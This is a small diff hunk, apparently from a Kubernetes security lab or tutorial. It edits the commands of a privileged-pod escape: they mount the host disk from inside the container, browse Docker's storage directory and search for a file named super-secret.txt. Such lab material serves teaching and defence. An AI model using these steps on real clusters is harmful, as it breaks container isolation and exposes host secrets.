@@ -51,8 +51,8 @@ kubectl exec -it privileged -- bash
 mkdir /host-data
 ```
 ```sh
-mount /dev/vda1 /host-data
+mount /dev/sda1 /host-data
 cd /host-data
-cd /host-data/var/lib/docker/overlay2
+cd /host-data/var/lib/docker/
 find . -name super-secret.txt
 ```
